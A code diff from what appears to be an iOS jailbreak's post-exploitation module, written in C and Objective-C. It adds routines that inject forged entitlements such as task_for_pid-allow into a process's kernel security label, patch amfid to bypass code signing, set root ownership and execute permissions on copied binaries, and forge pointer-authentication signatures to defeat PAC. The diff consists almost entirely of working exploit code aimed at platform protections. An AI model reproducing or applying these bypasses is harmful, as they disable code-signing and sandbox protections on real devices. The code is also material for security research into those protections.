@@ -18,7 +18,10 @@
 #include <unistd.h>
 #include <manticore/utils.h>
 #import <spawn.h>
+#include <ViewController.h>
 
+#include <sys/mman.h>
+#include <copyfile.h>
 #include <lib/tq/tq_common_p.h>
 #include <lib/tq/utils.h>
 #include <lib/tq/k_utils.h>
@@ -28,8 +31,12 @@
 #include "k_offsets.h"
 #include <util/alloc.h>
 
+#define JAILB_ROOT "/private/var/containers/Bundle/jb_resources/"
+static const char *jailb_root = JAILB_ROOT;
 extern char **environ;
 NSData *lastSystemOutput=nil;
+#define copyfile(X,Y) (copyfile)(X, Y, 0, COPYFILE_ALL|COPYFILE_RECURSIVE|COPYFILE_NOFOLLOW_SRC);
+
 
 int perform_root_patches(kptr_t ucred){
     uint32_t buffer[5] = {0, 0, 0, 1, 0};
@@ -61,19 +68,6 @@ int perform_root_patches(kptr_t ucred){
     
     
     return 0;
-}
-
-
-void patch_amfid(pid_t amfid_pid){
-    printf("* ------ AMFID Bypass ------ *\n");
-    kptr_t amfid_kernel_proc = kproc_find_by_pid(amfid_pid);
-    printf("amfid proc:\t%d\t->\t0x%llx\n", amfid_pid, amfid_kernel_proc);
-    printf("amfid task:\t0x%llx\n", amfid_kernel_proc + OFFSET(proc, task));
-    if(setCSFlagsByPID(amfid_pid)){
-        printf("Successfully set Amfid's CSFlags.\n");
-    } else {
-        printf("Unable to set Amfid's csflags.\n");
-    }
 }
 
 bool set_csflags(kptr_t proc, uint32_t flags, bool value) {
@@ -361,90 +355,6 @@ typedef CF_OPTIONS(uint32_t, SecCSFlags) {
     kSecCSConsiderExpiration = (NSUInteger)1 << 31,        /* consider expired certificates invalid */
 };
 
-typedef void *SecStaticCodeRef;
-extern "C" OSStatus SecStaticCodeCreateWithPathAndAttributes(CFURLRef path, SecCSFlags flags, CFDictionaryRef attributes, SecStaticCodeRef  _Nullable *staticCode);
-extern "C" OSStatus SecCodeCopySigningInformation(SecStaticCodeRef code, SecCSFlags flags, CFDictionaryRef  _Nullable *information);
-CFStringRef (*_SecCopyErrorMessageString)(OSStatus status, void * __nullable reserved) = NULL;
-enum cdHashType {
-    cdHashTypeSHA1 = 1,
-    cdHashTypeSHA256 = 2
-};
-
-static char *cdHashName[3] = {NULL, "SHA1", "SHA256"};
-static enum cdHashType requiredHash = cdHashTypeSHA256;
-
-const void *CFArrayGetValueAtIndex_prevenOverFlow(CFArrayRef theArray, CFIndex idx){
-    CFIndex arrCnt = CFArrayGetCount(theArray);
-    if(idx >= arrCnt){
-        idx = arrCnt - 1;
-    }
-    return CFArrayGetValueAtIndex(theArray, idx);
-}
-
-
-void *CDHashFor(char *file){
-    SecStaticCodeRef staticCode = NULL;
-    CFStringRef cfstr_path = CFStringCreateWithCString(kCFAllocatorDefault, file, kCFStringEncodingUTF8);
-    CFURLRef cfurl = CFURLCreateWithFileSystemPath(kCFAllocatorDefault, cfstr_path, kCFURLPOSIXPathStyle, false);
-    CFRelease(cfstr_path);
-    OSStatus result = SecStaticCodeCreateWithPathAndAttributes(cfurl, kSecCSDefaultFlags, NULL, &staticCode);
-    CFRelease(cfurl);
-    if (result != 0) {
-        if (_SecCopyErrorMessageString != NULL) {
-            CFStringRef error = _SecCopyErrorMessageString(result, NULL);
-            
-            (printf)("Unable to generate cdhash for %s: %s\n", file, CFStringGetCStringPtr(error, kCFStringEncodingUTF8));
-            CFRelease(error);
-        } else {
-            (printf)("Unable to generate cdhash for %s: %d\n", file, result);
-        }
-        return nil;
-    }
-    
-    CFDictionaryRef signinginfo;
-    result = SecCodeCopySigningInformation(staticCode, kSecCSDefaultFlags, &signinginfo);
-    CFRelease(staticCode);
-    if (result != 0) {
-        (printf)("Unable to copy cdhash info for %s\n", file);
-        return NULL;
-    }
-    
-    CFArrayRef cdhashes = (CFArrayRef)CFDictionaryGetValue(signinginfo, CFSTR("cdhashes"));
-    CFArrayRef algos = (CFArrayRef)CFDictionaryGetValue(signinginfo, CFSTR("digest-algorithms"));
-    int algoIndex = -1;
-    CFNumberRef nn = (CFNumberRef)CFArrayGetValueAtIndex_prevenOverFlow(algos, requiredHash);
-    if(nn){
-        CFNumberGetValue(nn, kCFNumberIntType, &algoIndex);
-    }
-    
-    (printf)("cdhashesCnt: %d\n", CFArrayGetCount(cdhashes));
-    (printf)("algosCnt: %d\n", CFArrayGetCount(algos));
-    
-    CFDataRef cdhash = NULL;
-    if (cdhashes == NULL) {
-        (printf)("%s: no cdhashes\n", file);
-    } else if (algos == NULL) {
-        (printf)("%s: no algos\n", file);
-    } else if (algoIndex == -1) {
-        (printf)("%s: does not have %s hash", cdHashName[requiredHash], file);
-    } else {
-        cdhash = (CFDataRef)CFArrayGetValueAtIndex_prevenOverFlow(cdhashes, requiredHash);
-        if (cdhash == NULL) {
-            (printf)("%s: missing %s cdhash entry\n", file, cdHashName[requiredHash]);
-        }
-    }
-    if(cdhash == NULL){
-        CFRelease(signinginfo);
-        return NULL;
-    }
-    
-    (printf)("cdhash len: %d\n", CFDataGetLength(cdhash));
-    char *rv = (char *)calloc(1, 20);
-    memcpy(rv, CFDataGetBytePtr(cdhash), 20);
-    CFRelease(signinginfo);
-    return rv;
-}
-
 bool isSymlink(const char *filename) {
     struct stat buf;
     if (lstat(filename, &buf) != ERR_SUCCESS) {
@@ -600,3 +510,250 @@ int waitForFile(const char *filename) {
     }
     return rv;
 }
+
+
+static struct kOSDict *self_macf;
+
+void reset_self_ents(kptr_t proc){
+    proc_write_MACF(proc, self_macf);
+}
+
+void proc_append_ents(kptr_t proc, const char *special_ents[], int n){
+    struct kOSDict *macf = proc_fetch_MACF(proc);
+    for (int i = 0; i < n; i++) {
+        fail_if(macf->count >= macf->cap, "no MACF slots, count %d, cap %d", macf->count, macf->cap);
+        struct kDictEntry *entry = borrow_fake_entitlement(special_ents[i]);
+        fail_if(entry == NULL, "Can not find entitlement %s", special_ents[i]);
+        macf->items[macf->count].key = entry->key;
+        macf->items[macf->count].value = entry->value;
+        macf->count += 1;
+    }
+    proc_write_MACF(proc, macf);
+    free(macf);
+}
+
+void enable_tfp_ents(kptr_t proc){
+    const char *special_ents[] = {
+        "task_for_pid-allow",
+        "com.apple.system-task-ports",
+    };
+    proc_append_ents(proc, special_ents, arrayn(special_ents));
+}
+
+void enable_container_ents(uint64_t proc){
+    const char *special_ents[] = {
+        "com.apple.private.security.container-manager",
+        "com.apple.private.security.storage.AppBundles",
+    };
+    proc_append_ents(proc, special_ents, arrayn(special_ents));
+}
+
+void patch_codesign(){
+    util_info("patch_codesign in progress..");
+
+    const char *amfid_bypassd_path = JAILB_ROOT"amfid_bypassd";
+    if (look_for_proc(amfid_bypassd_path)) {
+        util_info("amfid_bypassd already running");
+        return;
+    }
+
+    enable_tfp_ents(g_exp.self_proc);
+    pid_t amfid_pid = look_for_proc("/usr/libexec/amfid");
+    util_info("amfid_pid %u", amfid_pid);
+    patch_amfid(amfid_pid);
+    reset_self_ents(g_exp.self_proc);
+
+    // TODO
+//    pid_t amfid_bypassd_pid = 0;
+//    if(fork() == 0){
+//        daemon(1, 1);
+//        close(STDIN_FILENO);
+//        close(STDOUT_FILENO);
+//        close(STDERR_FILENO);
+//        const char *argv[] = {amfid_bypassd_path, NULL};
+//        execvp(argv[0], (char*const*)argv);
+//        exit(1);
+//    }
+//    while(!(amfid_bypassd_pid = look_for_proc(amfid_bypassd_path))){}
+//    util_info("amfid_bypassd_pid: %d", amfid_bypassd_pid);
+//    uint64_t target_proc = find_proc_byPID(amfid_bypassd_pid);
+//    uint64_t target_task = KernelRead_8bytes(target_proc + OFFSET_bsd_info_task);
+//    patch_TF_PLATFORM(target_task);
+    util_info("amfid_bypassd took off");
+}
+
+#pragma mark ---- Post-exp ---- Copy Jailbreak Resources
+
+void check_file_type_and_give_em_permission(char *file_path){
+    uint32_t HeaderMagic32 = 0xFEEDFACE; // MH_MAGIC
+    uint32_t HeaderMagic32Swapped = 0xCEFAEDFE; // MH_CIGAM
+    uint32_t HeaderMagic64 = 0xFEEDFACF; // MH_MAGIC_64
+    uint32_t HeaderMagic64Swapped = 0xCFFAEDFE; // MH_CIGAM_64
+    uint32_t UniversalMagic = 0xCAFEBABE; // FAT_MAGIC
+    uint32_t UniversalMagicSwapped = 0xBEBAFECA; // FAT_CIGAM
+
+    struct stat fstat = {0};
+    if(stat(file_path, &fstat)){
+        return;
+    }
+    if(fstat.st_size < (20))
+        return;
+
+    int fd = open(file_path, O_RDONLY);
+    if(fd){
+        uint32_t *file_head4bytes = (uint32_t *)mmap(NULL, PAGE_SIZE, PROT_READ, MAP_SHARED, fd, 0);
+        if((uintptr_t)(file_head4bytes) == -1){
+            close(fd);
+            return;
+        }
+        if((*file_head4bytes == HeaderMagic32) ||
+           (*file_head4bytes == HeaderMagic32Swapped) ||
+           (*file_head4bytes == HeaderMagic64) ||
+           (*file_head4bytes == HeaderMagic64Swapped) ||
+           (*file_head4bytes == UniversalMagic) ||
+           (*file_head4bytes == UniversalMagicSwapped) ||
+           !strncmp((char*)file_head4bytes, "#!", 2)
+           ){
+            chown(file_path, 0, 0);
+            chmod(file_path, 0755);
+        }
+        munmap(file_head4bytes, PAGE_SIZE);
+        close(fd);
+    }
+}
+
+#include <dirent.h>
+
+void alter_exec_perm_in_dir(const char *name, int i_deep){
+    DIR *dir;
+    struct dirent *entry;
+
+    if (!(dir = opendir(name))){
+        return;
+    }
+
+    while ((entry = readdir(dir)) != NULL) {
+        if (entry->d_type == DT_DIR) {
+            char path[1024];
+            if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
+                continue;
+            if(entry->d_name[0] == '.')
+                continue;
+            snprintf(path, sizeof(path), "%s/%s", name, entry->d_name);
+
+            alter_exec_perm_in_dir(path, i_deep+1);
+        } else {
+            char path[1024];
+            snprintf(path, sizeof(path), "%s/%s", name, entry->d_name);
+
+            check_file_type_and_give_em_permission(path);
+        }
+    }
+    closedir(dir);
+}
+
+void move_in_jbResources(){
+    util_info("copying shell cmds in progress...");
+
+    enable_container_ents(g_exp.self_proc);
+    int err = mkdir(jailb_root, 0777);
+    if (err) {
+        perror("mkdir");
+    }
+    // test amfid-bypass
+  //  copyfile(Build_resource_path("/jb_resources/id"), jailb_root);
+    alter_exec_perm_in_dir(JAILB_ROOT, 0);
+
+    reset_self_ents(g_exp.self_proc);
+}
+
+#pragma mark ---- userspace PAC bypass ----
+
+#if __arm64e__
+static mach_port_t amfid_thread;
+static volatile void *target_pc;
+static volatile void *signed_pc;
+
+static uint64_t thread_copy_jop_pid(mach_port_t to, mach_port_t from){
+    kptr_t thread_to = port_name_to_kobject(to);
+    kptr_t thread_from = port_name_to_kobject(from);
+    uint64_t jop_pid = kapi_read64(thread_from + OFFSET(thread, jop_pid));
+    uint64_t to_jop_pid = kapi_read64(thread_to + OFFSET(thread, jop_pid));
+    util_info("replace jop_pid %#llx -> %#llx", to_jop_pid, jop_pid);
+    kapi_write64(thread_to + OFFSET(thread, jop_pid), jop_pid);
+    return to_jop_pid;
+}
+
+static void thread_set_jop_pid(mach_port_t to, uint64_t jop_pid){
+    kptr_t thread_to = port_name_to_kobject(to);
+    kapi_write64(thread_to + OFFSET(thread, jop_pid), jop_pid);
+}
+
+static void uPAC_bypass_strategy_2(){
+    mach_port_t thread;
+    kern_return_t err;
+
+    err = thread_create(mach_task_self(), &thread);
+    fail_if(err != KERN_SUCCESS, "Created thread");
+
+    arm_thread_state64_t state;
+    mach_msg_type_number_t count = ARM_THREAD_STATE64_COUNT;
+    err = thread_get_state(mach_thread_self(), ARM_THREAD_STATE64, (thread_state_t)&state, &count);
+    fail_if(err != KERN_SUCCESS, "Got own thread state");
+
+    void *pc = (void *)((uintptr_t)target_pc & ~0xffffff8000000000);
+    pc = ptrauth_sign_unauthenticated(pc, ptrauth_key_asia, ptrauth_string_discriminator("pc"));
+    state.__opaque_pc = pc;
+    err = thread_set_state(thread, ARM_THREAD_STATE64, (thread_state_t)&state, ARM_THREAD_STATE64_COUNT);
+    fail_if(err != KERN_SUCCESS, "Set child thread's PC to a corrupted pointer");
+
+    uint64_t saved_jop_pid = thread_copy_jop_pid(thread, amfid_thread);
+    count = ARM_THREAD_STATE64_COUNT;
+    err = thread_get_state(thread, ARM_THREAD_STATE64, (thread_state_t)&state, &count);
+    fail_if(err != KERN_SUCCESS, "Got child's thread state");
+
+    signed_pc = state.__opaque_pc;
+    util_info("strategy 2, signed pc %p", signed_pc);
+
+    thread_set_jop_pid(thread, saved_jop_pid);
+    err = thread_terminate(thread);
+    fail_if(err != KERN_SUCCESS, "Terminated thread");
+}
+
+static void uPAC_bypass_strategy_3(){
+    mach_port_t thread;
+    kern_return_t err;
+
+    err = thread_create(mach_task_self(), &thread);
+    fail_if(err != KERN_SUCCESS, "Created thread");
+
+    arm_thread_state64_t state;
+    mach_msg_type_number_t count = ARM_THREAD_STATE64_COUNT;
+    err = thread_get_state(mach_thread_self(), ARM_THREAD_STATE64, (thread_state_t)&state, &count);
+    fail_if(err != KERN_SUCCESS, "Got own thread state");
+
+    void *pc = (void *)((uintptr_t)target_pc & ~0xffffff8000000000);
+    pc = ptrauth_sign_unauthenticated(pc, ptrauth_key_asia, ptrauth_string_discriminator("pc"));
+    state.__opaque_pc = pc;
+    arm_thread_state64_t amfid_state;
+    count = ARM_THREAD_STATE64_COUNT;
+    err = thread_convert_thread_state(amfid_thread, THREAD_CONVERT_THREAD_STATE_FROM_SELF, ARM_THREAD_STATE64,
+            (thread_state_t)&state, ARM_THREAD_STATE64_COUNT,
+            (thread_state_t)&amfid_state, &count);
+    fail_if(err != KERN_SUCCESS, "Convert thread");
+
+    signed_pc = amfid_state.__opaque_pc;
+    util_info("strategy 3, signed pc %p", amfid_state.__opaque_pc);
+
+    err = thread_terminate(thread);
+    fail_if(err != KERN_SUCCESS, "Terminated thread");
+}
+
+void *userspace_PAC_hack(mach_port_t target_thread, void *pc){
+    amfid_thread = target_thread;
+    target_pc = pc;
+    //uPAC_bypass_strategy_2();
+    uPAC_bypass_strategy_3();
+    return (void *)signed_pc;
+}
+#endif
